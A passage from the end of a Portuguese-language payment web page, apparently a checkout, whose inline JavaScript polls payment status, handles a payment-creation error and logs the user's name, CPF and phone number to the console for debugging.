                checkStatusInterval = setInterval(checkPaymentStatus, 3000);
            })
            .catch(error => {
                console.error("Erro ao criar pagamento:", error);
                alert("Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente.");
                
                // Esconder overlay e popup
                overlay.style.display = 'none';
                popup.style.display = 'none';
            });
          });
        } // Fechamento do if (elementsExist)
        
        // Log para depuração final
        console.log('Dados do usuário finais:', { 
            nome: userData.nome, 
            primeiro_nome: firstName, 
            cpf: userData.cpf, 
            telefone: userData.telefone 
        });
    </script>
</body>
</html>